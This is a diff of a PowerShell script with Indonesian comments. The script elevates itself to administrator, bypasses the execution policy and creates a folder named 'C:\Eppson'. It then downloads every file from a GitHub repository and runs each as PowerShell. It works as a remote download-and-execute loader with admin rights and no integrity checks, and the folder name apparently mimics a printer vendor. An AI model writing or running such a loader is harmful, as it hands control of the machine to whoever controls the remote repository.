@@ -1,29 +1,57 @@
-# === Jalankan ulang dengan hak Admin jika belum ===
+# [1] Jalankan sebagai Admin
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
-    [Security.Principal.WindowsBuiltInRole] "Administrator"))
-{
+    [Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
 
-# === Minimize Semua Jendela ===
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public class Win32 {
-  [DllImport("user32.dll")]
-  public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
-  [DllImport("user32.dll")]
-  public static extern bool EnumWindows(Func<IntPtr, int, bool> enumFunc, int lParam);
-  [DllImport("user32.dll")]
-  public static extern bool IsWindowVisible(IntPtr hWnd);
-}
-"@
+# [2] Persiapan folder dan log
+$targetFolder = "C:\Eppson"
+$logPath = "$targetFolder\check-log.txt"
 
-$SW_MINIMIZE = 6
-$null = [Win32]::EnumWindows({ param($hWnd, $lParam)
-    if ([Win32]::IsWindowVisible($hWnd)) {
-        [Win32]::ShowWindowAsync($hWnd, $SW_MINIMIZE) | Out-Null
+if (-not (Test-Path $targetFolder)) {
+    New-Item -ItemType Directory -Path $targetFolder | Out-Null
+    Add-Content -Path $logPath -Value "$(Get-Date) - Folder 'Eppson' dibuat"
+} else {
+    Add-Content -Path $logPath -Value "$(Get-Date) - Folder 'Eppson' sudah ada"
+}
+
+# [3] Cek GitHub
+$repoUser = "aziaditiya"
+$repoName = "automation"
+$branch = "main"
+$apiUrl = "https://api.github.com/repos/$repoUser/$repoName/contents/"
+$existingFiles = Get-ChildItem $targetFolder | Select-Object -ExpandProperty Name
+
+try {
+    $response = Invoke-RestMethod -Uri $apiUrl
+    Add-Content -Path $logPath -Value "$(Get-Date) - Berhasil akses repo GitHub"
+} catch {
+    Add-Content -Path $logPath -Value "$(Get-Date) - Gagal akses GitHub: $($_.Exception.Message)"
+    exit
+}
+
+foreach ($file in $response) {
+    $remoteName = $file.name
+    $fileUrl = $file.download_url
+
+    # Cek nama mirip
+    $similar = $existingFiles | Where-Object { $_ -like "$($remoteName.Split('.')[0])*" }
+    if ($similar) {
+        Add-Content -Path $logPath -Value "$(Get-Date) - Lewati file mirip: $remoteName"
+        continue
     }
-    return $true
-}, 0)
+
+    # Download dan eksekusi
+    $localPath = Join-Path $targetFolder $remoteName
+    try {
+        Invoke-WebRequest -Uri $fileUrl -OutFile $localPath -UseBasicParsing
+        Add-Content -Path $logPath -Value "$(Get-Date) - Berhasil download: $remoteName"
+        Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$localPath`""
+    }
+    catch {
+        $errorMsg = "$(Get-Date) - Gagal download/jalankan $remoteName - $($_.Exception.Message)"
+        Add-Content -Path $logPath -Value $errorMsg
+        notepad.exe $logPath
+    }
+}
